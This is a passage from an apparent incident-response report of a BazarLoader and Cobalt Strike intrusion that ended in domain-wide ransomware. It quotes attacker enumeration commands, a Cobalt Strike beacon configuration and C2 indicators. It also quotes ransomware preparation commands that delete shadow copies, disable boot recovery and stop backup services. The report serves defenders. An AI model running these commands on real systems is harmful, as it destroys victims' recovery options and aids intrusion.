<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4953" src="https://thedfirreport.com/wp-content/uploads/2021/12/222.png" alt width="1058" height="253" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/222.png 1058w, https://thedfirreport.com/wp-content/uploads/2021/12/222-300x72.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/222-1024x245.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/222-768x184.png 768w" sizes="(max-width: 1058px) 100vw, 1058px" /></p>
<p>We also observed the threat actor using <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="nofollow noopener">Rubeus</a> to <a href="https://adsecurity.org/?p=2293" target="_blank" rel="nofollow noopener">kerberoast</a> and <a href="http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/" target="_blank" rel="nofollow noopener">asreproast</a> the environment.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/rubeus.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4919" src="https://thedfirreport.com/wp-content/uploads/2021/12/rubeus.png" alt width="1440" height="123" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/rubeus.png 1440w, https://thedfirreport.com/wp-content/uploads/2021/12/rubeus-300x26.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/rubeus-1024x87.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/rubeus-768x66.png 768w" sizes="(max-width: 1440px) 100vw, 1440px" /></a></p>
<h3 id="discovery">Discovery</h3>
<p>BazaLoader was observed executing the well known battery of Windows discovery commands around 10 minutes after execution on the beachhead host.</p>
<pre>net group /domain admins
net group "Domain Computers" /domain
net localgroup administrator
net view /all
nltest /domain_trusts /all_trusts</pre>
<p>Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat. This has been observed multiple times by different ransomware groups. The threat actor ran AdFind twice, once using adf.bat file with AdFind renamed to qq.</p>
<pre><code>qq.exe  <span class="hljs-operator">-f</span> <span class="hljs-string">"(objectcategory=person)"</span> 
qq.exe  <span class="hljs-operator">-f</span> <span class="hljs-string">"objectcategory=computer"</span>
qq.exe <span class="hljs-operator">-f</span> <span class="hljs-string">"(objectcategory=organizationalUnit)"</span>
qq.exe -sc trustdmp
qq.exe -subnets <span class="hljs-operator">-f</span> (objectCategory=subnet)
qq.exe  <span class="hljs-operator">-f</span> <span class="hljs-string">"(objectcategory=group)"</span>
qq.exe -gcb -sc trustdmp
</code></pre>
<p>The second time, they copy/pasted commands from adf.bat and executed them with AdFind.exe.</p>
<p>On the second day, the following commands were executed before they started working on moving laterally in the domain.</p>
<pre><code><span class="hljs-keyword">net</span> group <span class="hljs-string">"Domain Admins"</span> /domain
<span class="hljs-keyword">whoami</span>
<span class="hljs-keyword">nslookup</span>
<span class="hljs-keyword">ipconfig</span> /<span class="hljs-literal">all</span>
<span class="hljs-keyword">systeminfo</span>
<span class="hljs-keyword">tasklist</span>
<span class="hljs-keyword">net</span> group <span class="hljs-string">"Enterprise admins"</span> /domain
<span class="hljs-keyword">net</span> localgroup administrators
<span class="hljs-keyword">whoami</span> /<span class="hljs-literal">all</span>
<span class="hljs-keyword">net</span> use
<span class="hljs-keyword">query</span> user
</code></pre>
<p>During the course of the intrusion, we observed execution of the utility &#8220;Advanced IP Scanner&#8221; to perform network scanning (over ports 21,80,445,4899,8080).</p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/a2aee81594c2d040d3a8cdedc8283a08acbfb1eec5e9612abf9cd8b4a7a1d799" alt="enter image description here" /></p>
<p>Advanced IP Scanner was downloaded using Internet Explorer on a server:</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4943" src="https://thedfirreport.com/wp-content/uploads/2021/12/4.png" alt width="1198" height="71" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/4.png 1198w, https://thedfirreport.com/wp-content/uploads/2021/12/4-300x18.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/4-1024x61.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/4-768x46.png 768w" sizes="(max-width: 1198px) 100vw, 1198px" /></p>
<p>and then run with the portable option:</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4944" src="https://thedfirreport.com/wp-content/uploads/2021/12/5.png" alt width="746" height="545" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/5.png 746w, https://thedfirreport.com/wp-content/uploads/2021/12/5-300x219.png 300w" sizes="(max-width: 746px) 100vw, 746px" /></p>
<p>We also saw &#8220;MSSQLUDPScanner.exe&#8221; used for discovery of MSSQL instances across the environment.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4940" src="https://thedfirreport.com/wp-content/uploads/2021/12/1.png" alt width="543" height="124" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/1.png 543w, https://thedfirreport.com/wp-content/uploads/2021/12/1-300x69.png 300w" sizes="(max-width: 543px) 100vw, 543px" /></p>
<p>We believe the tool used is <a href="https://twitter.com/424f424f">rvrsh3ll&#8217;s</a> <a href="https://github.com/rvrsh3ll/MSSQLUDPScanner" target="_blank" rel="noopener">MSSQLUDPScanner</a></p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4980" src="https://thedfirreport.com/wp-content/uploads/2021/12/4444.png" alt width="786" height="257" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/4444.png 786w, https://thedfirreport.com/wp-content/uploads/2021/12/4444-300x98.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/4444-768x251.png 768w" sizes="(max-width: 786px) 100vw, 786px" /></p>
<p>Comparing compiled version to executable from this intrusion</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4981" src="https://thedfirreport.com/wp-content/uploads/2021/12/1-1.png" alt width="3170" height="2044" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/1-1.png 3170w, https://thedfirreport.com/wp-content/uploads/2021/12/1-1-300x193.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/1-1-1024x660.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/1-1-768x495.png 768w, https://thedfirreport.com/wp-content/uploads/2021/12/1-1-1536x990.png 1536w, https://thedfirreport.com/wp-content/uploads/2021/12/1-1-2048x1321.png 2048w" sizes="(max-width: 3170px) 100vw, 3170px" /></p>
<p>Before execution of AdFind.exe, adf.bat was run.</p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/2ae9aee76c1c5220cd055c948b5dc1abd23b8e7c75494e892c39de455b85a360" alt="enter image description here" /></p>
<p>Via RDP they manually ran <a href="https://twitter.com/Carlos_Perez" target="_blank" rel="noopener">@carlos_perez</a>&#8216;s <a href="https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1" target="_blank" rel="nofollow noopener">Invoke-Sharefinder.ps1</a> on a server. It then looks like they manually copied the output to a file named shares.txt.</p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/89d4f93451f3c7a2268f161bd4b7bb7562112e9f9a9c80d2fe05cdd82d2e82b2" alt="enter image description here" /></p>
<p>After each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.</p>
<p><img loading="lazy" decoding="async" class="alignnone wp-image-4977 size-full" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-16.png" alt width="1148" height="187" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-16.png 1148w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-16-300x49.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-16-1024x167.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-16-768x125.png 768w" sizes="(max-width: 1148px) 100vw, 1148px" /></p>
<h3 id="lateral-movement">Lateral Movement</h3>
<p>We observed the threat actor using RDP as their main tool to do lateral movement in the environment. Most likely using credentials gathered through dumping of either lsass, or the registry hives. The first instance was through the beachhead where they used Cobalt Strike as a reverse proxy. This also revealed their Workstation Name which is <code>WIN-799RI0TSTOF</code>.</p>
<hr/>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/8c9298ecb3c70b8d09f40a6696bc426223e0d65b18d483c0c6519b356b853e86" alt="rdp" /></p>
<hr/>
<p>After they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.</p>
<h3 id="collection">Collection</h3>
<p>The threat actors attempted to dump a database using <a href="https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-ver15" target="_blank" rel="noopener">sqlcmd.exe</a> but the connection to the MSSQL server failed.</p>
<pre><code>sqlcmd  -E -S localhost -Q "<span class="hljs-operator"><span class="hljs-keyword">BACKUP</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">master</span> <span class="hljs-keyword">TO</span> DISK=<span class="hljs-string">'c:\programdata\sql\master.bak'</span><span class="hljs-string">"</span></span></code></pre>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/f274c552091f80e3852d2f59aa3c2700ac8f9632c23e909784f19292ece860ca" alt="enter image description here" /></p>
<h3 id="command-and-control">Command and Control</h3>
<p><strong>BazarLoader:</strong></p>
<p>206.189.49.239:443</p>
<pre>JA3: 72a589da586844d7f0818ce684948eea
JA3s: 3f48aac872b1dbe54fa3547535ec9d43</pre>
<pre>Certificate: [<span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>3d:c3:4b:ff:95:d0:ae:52:f3:1e:18:e2:18:9e:0b:38:8c:f0:cf:b9</span></a> </span></span>]
Not Before: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>2021/10/18 14:47:32 UTC</span></a> 
</span></span>Not After: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>2022/10/18 14:47:32 UTC</span></a> 
</span></span>Issuer Org: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>Akdeniz Ltd.</span></a> 
</span></span>Subject Common: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>turkcell.info</span></a> 
</span></span>Subject Org: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>Akdeniz Ltd.</span></a> 
</span></span>Public Algorithm: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>id-ecPublicKey</span></a> 
</span></span>Curve: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>prime256v1</span></a></span></span></pre>
<pre><code><span class="hljs-attribute">Subject</span>: <span class="hljs-string">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9bfef6faf2f7daffffe9fee8e8a6fcf4f4fff6faf5e8f3faf5f5f4f5dbe8effeecfae9efb6f8f4f4f0b5f8f4f6">[email&#160;protected]</a>,CN=turkcell.info,O=Akdeniz Ltd.,L=\\C3\\83\\C2\\87orluburgh,ST=Missouri,C=BE",</span>

<span class="http"><span class="hljs-attribute">Issuer</span>: <span class="hljs-string">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bedbd3dfd7d2ffdadaccdbcdcd83d9d1d1dad3dfd0cdd6dfd0d0d1d0fecdcadbc9dfccca93ddd1d1d590ddd1d3">[email&#160;protected]</a>,CN=turkcell.info,O=Akdeniz Ltd.,L=\\C3\\83\\C2\\87orluburgh,ST=Missouri,C=BE",</span>

<span class="hljs-attribute">Validation_status</span>: <span class="hljs-string">"self signed certificate",</span></span></code></pre>
<p>159.223.31.75:443</p>
<pre>JA3: 72a589da586844d7f0818ce684948eea
JA3s: 3f48aac872b1dbe54fa3547535ec9d43</pre>
<pre>Certificate: [<span class="detail-field" data-v-6144aac9><span data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>be:b3:98:a3:a2:ce:e0:63:0b:7a:02:34:13:5b:0a:b5:4a:a4:21:71</span></a> </span></span></span>]
<strong class="medium ml-1">Not Before: </strong><span class="detail-field" data-v-6144aac9><span data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>2021/10/18 14:47:32 UTC</span></a> 
</span></span></span><strong class="medium ml-1">Not After: </strong><span class="detail-field" data-v-6144aac9><span data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>2022/10/18 14:47:32 UTC</span></a> 
</span></span></span><strong class="medium ml-1">Issuer Org: </strong><span class="detail-field" data-v-6144aac9><span data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>Åafak FÄ±rat Ltd.</span></a> 
</span></span></span><strong class="medium ml-1">Subject Common: </strong><span class="detail-field" data-v-6144aac9><span data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>masomo.com</span></a> 
</span></span></span><strong class="medium ml-1">Subject Org: </strong><span class="detail-field" data-v-6144aac9><span data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>Åafak FÄ±rat Ltd.</span></a> 
</span></span></span><strong class="medium ml-1">Public Algorithm: </strong><span class="detail-field" data-v-6144aac9><span data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>id-ecPublicKey</span></a> 
</span></span></span><strong class="medium ml-1">Curve: </strong><span class="detail-field" data-v-6144aac9><span data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>prime256v1</span></a></span></span></span></pre>
<p><strong>Cobalt Strike C2:</strong></p>
<p>hiduwu.com<br/>
108.62.141.87:443</p>
<pre>JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767</pre>
<pre>Certificate: [<span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>a5:4e:ed:32:cd:76:a3:97:6b:ad:a1:df:42:36:6d:38:54:4c:a5:4e</span></a> </span></span>]
Not Before: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>2021/09/29 00:00:00 UTC</span></a> 
</span></span>Not After: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>2022/09/29 23:59:59 UTC</span></a> 
</span></span>Issuer Org: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>Sectigo Limited</span></a> 
</span></span>Subject Common: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>hiduwu.com</span></a> </span></span>[<span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>hiduwu.com</span></a> </span></span>,<span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>www.hiduwu.com</span></a> </span></span>]
Public Algorithm: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>rsaEncryption</span></a></span></span></pre>
<p>gawocag.com</p>
<p>23.81.246.32:443</p>
<pre>JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767</pre>
<pre>Certificate: [<span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>32:be:aa:28:c6:bc:f3:f6:cf:31:c5:e5:2a:bf:1a:c1:a4:70:d1:6b</span></a> </span></span>]
Not Before: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>2021/10/11 00:00:00 UTC</span></a> 
</span></span>Not After: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>2022/10/11 23:59:59 UTC</span></a> 
</span></span>Issuer Org: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>Sectigo Limited</span></a> 
</span></span>Subject Common: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>gawocag.com</span></a> </span></span>[<span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>gawocag.com</span></a> </span></span>,<span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>www.gawocag.com</span></a> </span></span>]
Public Algorithm: <span class="detail-field" data-v-6144aac9><span class="field cursor-pointer" data-v-6144aac9><a class="value" data-v-6144aac9><span class="all-copy" data-v-6144aac9>rsaEncryption</span></a></span></span></pre>
<pre><code>{
"<span class="hljs-attribute">x64</span>": <span class="hljs-value">{
"<span class="hljs-attribute">sha256</span>": <span class="hljs-string">"0cb20cf74f9c5896442c82f875e9221cae606ffa124e53d013b8d13b6988f8cc"</span>,
    "<span class="hljs-attribute">uri_queried</span>": <span class="hljs-string">"/fVWJ"</span>,
    "<span class="hljs-attribute">config</span>": {
      "<span class="hljs-attribute">Spawn To x86</span>": <span class="hljs-string">"%windir%\\syswow64\\rundll32.exe"</span>,
      "<span class="hljs-attribute">Watermark</span>": <span class="hljs-number">1580103814</span>,
      "<span class="hljs-attribute">C2 Host Header</span>": <span class="hljs-string">""</span>,
      "<span class="hljs-attribute">HTTP Method Path 2</span>": <span class="hljs-string">"/sm"</span>,
      "<span class="hljs-attribute">Beacon Type</span>": <span class="hljs-string">"8 (HTTPS)"</span>,
      "<span class="hljs-attribute">Method 1</span>": <span class="hljs-string">"GET"</span>,
      "<span class="hljs-attribute">Spawn To x64</span>": <span class="hljs-string">"%windir%\\sysnative\\rundll32.exe"</span>,
      "<span class="hljs-attribute">Method 2</span>": <span class="hljs-string">"POST"</span>,
      "<span class="hljs-attribute">C2 Server</span>": <span class="hljs-string">"gawocag.com,/nd"</span>,
      "<span class="hljs-attribute">Jitter</span>": <span class="hljs-number">10</span>,
      "<span class="hljs-attribute">Port</span>": <span class="hljs-number">443</span>,
      "<span class="hljs-attribute">Polling</span>": <span class="hljs-number">5000</span>
    },
    "<span class="hljs-attribute">sha1</span>": <span class="hljs-string">"72db453ad1ab5ea483e5046864f3a8c295e7fef4"</span>,
    "<span class="hljs-attribute">time</span>": <span class="hljs-number">1634637833485.8</span>,
    "<span class="hljs-attribute">md5</span>": <span class="hljs-string">"abd213722fae891f54c28640d751200f"</span>
  }</span>,
  "<span class="hljs-attribute">x86</span>": <span class="hljs-value">{
    "<span class="hljs-attribute">sha256</span>": <span class="hljs-string">"b08ae2fec4c0c64113947c14d9ab6f4a3e61a9d60e182b59e20b5b3606df8569"</span>,
    "<span class="hljs-attribute">uri_queried</span>": <span class="hljs-string">"/C5jz"</span>,
    "<span class="hljs-attribute">config</span>": {
      "<span class="hljs-attribute">Spawn To x86</span>": <span class="hljs-string">"%windir%\\syswow64\\rundll32.exe"</span>,
      "<span class="hljs-attribute">Watermark</span>": <span class="hljs-number">1580103814</span>,
      "<span class="hljs-attribute">C2 Host Header</span>": <span class="hljs-string">""</span>,
      "<span class="hljs-attribute">HTTP Method Path 2</span>": <span class="hljs-string">"/sm"</span>,
      "<span class="hljs-attribute">Beacon Type</span>": <span class="hljs-string">"8 (HTTPS)"</span>,
      "<span class="hljs-attribute">Method 1</span>": <span class="hljs-string">"GET"</span>,
      "<span class="hljs-attribute">Spawn To x64</span>": <span class="hljs-string">"%windir%\\sysnative\\rundll32.exe"</span>,
      "<span class="hljs-attribute">Method 2</span>": <span class="hljs-string">"POST"</span>,
      "<span class="hljs-attribute">C2 Server</span>": <span class="hljs-string">"gawocag.com,/nd"</span>,
      "<span class="hljs-attribute">Jitter</span>": <span class="hljs-number">10</span>,
      "<span class="hljs-attribute">Port</span>": <span class="hljs-number">443</span>,
      "<span class="hljs-attribute">Polling</span>": <span class="hljs-number">5000</span>
    },
    "<span class="hljs-attribute">sha1</span>": <span class="hljs-string">"f3003f34c9cb595e94fa632b537bf5a76869954d"</span>,
    "<span class="hljs-attribute">time</span>": <span class="hljs-number">1634637826726</span>,
    "<span class="hljs-attribute">md5</span>": <span class="hljs-string">"3303703eef699663fd3f0982922e8e30"</span>
  }
</span></code></pre>
<h3 id="exfiltration">Exfiltration</h3>
<p>On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.</p>
<p>Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.</p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/d1eeb8b2115135c8123a0df44ce47a9d8dff2462ee01b3ab7cae84f613e454db" alt="enter image description here" /></p>
<p>Here we can see the threat actor actively exfiltrating our information using FileZilla.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-d6.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4932" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-d6.png" alt width="571" height="595" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-d6.png 571w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-d6-288x300.png 288w" sizes="(max-width: 571px) 100vw, 571px" /></a></p>
<p>We also saw the threat actors exfiltrate databases by dragging and dropping information into FileZilla.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4955" src="https://thedfirreport.com/wp-content/uploads/2021/12/11111.png" alt width="1021" height="656" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/11111.png 1021w, https://thedfirreport.com/wp-content/uploads/2021/12/11111-300x193.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/11111-768x493.png 768w" sizes="(max-width: 1021px) 100vw, 1021px" /></p>
<p>After pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4946" src="https://thedfirreport.com/wp-content/uploads/2021/12/55.png" alt width="1178" height="86" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/55.png 1178w, https://thedfirreport.com/wp-content/uploads/2021/12/55-300x22.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/55-1024x75.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/55-768x56.png 768w" sizes="(max-width: 1178px) 100vw, 1178px" /></p>
<p>And then uploaded the dump file to <a href="https://ufile.io/" target="_blank" rel="nofollow noopener">ufile.io</a> using Internet Explorer on a server. <img loading="lazy" decoding="async" class src="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/285/eyes_1f440.png" alt="Eyes on Apple iOS 14.6" width="27" height="27" /></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-d7.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4922" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-d7.png" alt width="812" height="595" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-d7.png 812w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-d7-300x220.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-d7-768x563.png 768w" sizes="(max-width: 812px) 100vw, 812px" /></a></p>
<h3 id="impact">Impact</h3>
<p>On the third day, the threat actors began their final actions. The final actions took place from a compromised file server. They began with a ping sweep to locate all live hosts. After that completed, they reviewed the results on the host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-12-r.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4928" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-12-r.png" alt width="492" height="414" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-12-r.png 492w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-12-r-300x252.png 300w" sizes="(max-width: 492px) 100vw, 492px" /></a></p>
<p>From a file server, the threat actors then established RDP connections to all the machines in the environment.  The threat actors transferred 2 files onto the machines they connected to. A batch script named kill.bat and a ransomware executable CryptoLocker64.exe.</p>
<p>The batch script is responsible for deletion of volume shadow copies, turning off automatic repairs and stopping all the running services on the host. Some of the commands are as follows:</p>
<pre><code>sc  config "Netbackup Legacy Network service" <span class="hljs-operator"><span class="hljs-keyword">start</span>= disabled
bcdedit  /<span class="hljs-keyword">set</span> {<span class="hljs-keyword">default</span>}
bcdedit  /<span class="hljs-keyword">set</span> {<span class="hljs-keyword">default</span>} recoveryenabled <span class="hljs-keyword">No</span> 
vssadmin.exe  <span class="hljs-keyword">Delete</span> Shadows /all /quiet
wmic.exe  Shadowcopy <span class="hljs-keyword">Delete</span>
net  <span class="hljs-keyword">stop</span> <span class="hljs-string">"Zoolz 2 Service"</span> /y
net  <span class="hljs-keyword">stop</span> <span class="hljs-string">"Veeam Backup Catalog Data Service"</span> /y
net  <span class="hljs-keyword">stop</span> <span class="hljs-string">"Symantec System Recovery"</span> /y
net  <span class="hljs-keyword">stop</span> <span class="hljs-string">"SQLsafe Filter Service"</span> /y
net  <span class="hljs-keyword">stop</span> <span class="hljs-string">"SQLsafe Backup Service"</span> /y
net  <span class="hljs-keyword">stop</span> <span class="hljs-string">"SQL Backups"</span> /y
net  <span class="hljs-keyword">stop</span> <span class="hljs-string">"Acronis VSS Provider"</span> /y
net  <span class="hljs-keyword">stop</span> VeeamDeploySvc /y
net  <span class="hljs-keyword">stop</span> BackupExecVSSProvider /y
net  <span class="hljs-keyword">stop</span> BackupExecRPCService /y
net  <span class="hljs-keyword">stop</span> BackupExecManagementService /y
net  <span class="hljs-keyword">stop</span> BackupExecJobEngine /y
net  <span class="hljs-keyword">stop</span> BackupExecDeviceMediaService /y
</span></code></pre>
<p>After completion of this activity, the ransomware binary was executed manually over the RDP connections.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-13-r.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4929" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-13-r.png" alt width="643" height="421" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-13-r.png 643w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-13-r-300x196.png 300w" sizes="(max-width: 643px) 100vw, 643px" /></a></p>
<p>From the threat actors starting their ping sweep, to final host encryption, about an hour passed leaving behind the ransom note for the organization to find. The threat actors went from initial access to domain wide ransomware in just under two days.</p>
<hr/>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-r4-r.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4923" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-r4-r.png" alt width="1306" height="396" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-r4-r.png 1306w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-r4-r-300x91.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-r4-r-1024x310.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-r4-r-768x233.png 768w" sizes="(max-width: 1306px) 100vw, 1306px" /></a></p>
<hr/>
<h3 id="iocs">IOCs</h3>
<p>Network</p>
<pre><code><span class="hljs-tag">BazarLoader</span>
<span class="hljs-tag">turkcell</span><span class="hljs-attr_selector">[.]</span><span class="hljs-tag">info</span>
159<span class="hljs-class">.223</span><span class="hljs-class">.31</span><span class="hljs-attr_selector">[.]</span>75
206<span class="hljs-class">.189</span><span class="hljs-class">.49</span><span class="hljs-attr_selector">[.]</span>239

<span class="hljs-tag">Cobalt</span> <span class="hljs-tag">Strike</span>
23<span class="hljs-class">.81</span><span class="hljs-class">.246</span><span class="hljs-attr_selector">[.]</span>32
gawocag.com
108<span class="hljs-class">.62</span><span class="hljs-class">.141</span><span class="hljs-attr_selector">[.]</span>87
hiduwu.com

<span class="hljs-tag">SFTP</span> <span class="hljs-tag">Exfiltration</span>
192<span class="hljs-class">.52</span><span class="hljs-class">.167</span><span class="hljs-attr_selector">[.]</span>210
23<span class="hljs-class">.152</span><span class="hljs-class">.0</span><span class="hljs-attr_selector">[.]</span>22
</code></pre>
<p>File</p>
<pre><code>Bazar
Documents.lnk
<span class="hljs-number">4</span>d8af5ba95aa23f7162b7bbf8622d801
d5b8c1a219686be5b75e58c560609023b491d9aa
e87f9f378590b95de1b1ef2aaab84e1d00f210fd6aaf5025d815f33096c9d162

